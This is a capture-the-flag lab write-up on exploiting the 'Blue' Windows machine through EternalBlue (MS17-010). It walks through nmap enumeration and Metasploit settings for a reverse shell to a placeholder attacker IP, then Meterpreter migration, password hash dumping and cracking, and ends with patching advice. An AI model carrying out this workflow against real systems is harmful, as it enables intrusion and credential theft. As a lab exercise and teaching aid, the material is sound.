# 🟦 Machine 01 — Blue

## 📌 Overview
Blue is a Windows machine vulnerable to EternalBlue (MS17-010).  
The objective is to identify the SMB vulnerability, exploit it to gain a shell, and escalate privileges to obtain full system access.

---

## 🔍 1. Enumeration

### 🔸 Nmap Scan

```nmap -sCV -n -Pn -p- -oN scan.nmap <TARGET_IP>```

---

### 🔸 Key Findings
- SMB (port 445) open  
- Potential MS17-010 vulnerability  
- Windows 7 / Server 2008 R2 fingerprint  

---

## 🛠️ 2. Tools Used

These are the primary tools and utilities used during the assessment of this machine:

- **Nmap** — Network scanning and service enumeration    
- **Metasploit Framework** — Exploitation and payload handling  

---

## 🎯 3. Exploitation

### 🔸 EternalBlue (MS17-010)
- Vulnerability confirmed
  ![Confirmed](../Images/01-Blue/vulnConfirmed.png)
- Use of Metasploit for payloads
  ![ms17-010](../Images/01-Blue/ms17_010.png)

- Setting payload to use

![setPayload](../Images/01-Blue/setPayload.png)

- Setting options:
  - set RHOST $IP
  - set LHOST $ATTACKER-IP
  - set LPORT $ATTACKER-PORT
  - run
![setting](../Images/01-Blue/shellMetasploit.png)
    

---

## 🚀 4. Privilege Escalation
Since EternalBlue grants SYSTEM, no additional escalation is required.  
![rootConfirmed](../Images/01-Blue/rootConfirmed.png)

Now we need to upgrade our shell to a Meterpreter shell, because the next step is to hashdump to extract the hash of the non-default user. To do this, we use the "background" command or just Ctrl+Z, then load the module post(multi/manage/shell/to/meterpreter), change the SESSION option and select SESSION 2 'meterpreter x86/windows'.

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM. 

Migrate to this process

```migrate $ID```

- Use of hashdump
  
![hashdump](../Images/01-Blue/hashdump.png)

To obtain Jon’s password, I used CrackStation, but it’s also possible to do it with JohnTheRipper or Hashcat.

---

## 📂 5. Loot & Flags
- Logged in as Administrator, the flag1.txt file is located in the C:\ directory
![flag1.txt](../Images/01-Blue/flag1.txt.png)
 
- Logged in as Administrator, the flag2.txt file is located in the same directory as the SAM database C:\windows\System32\config
![flag2.txt](../Images/01-Blue/flag2.txt.png)
  
- Logged in as Jon, the flag3.txt file is located in C:\Users\Jon\Documents

![flag2.txt](../Images/01-Blue/flag3.txt.png)   

---

## 🛡️ 6. Defensive Takeaways
- Disable SMBv1  
- Apply MS17-010 patch  
- Monitor anomalous SMB traffic  
- Harden legacy Windows systems  

---

## 🧠 7. Lessons Learned
- Importance of patch management  
- EternalBlue exploitation workflow  
- SMB enumeration methodology  
- Windows post-exploitation basics  
 
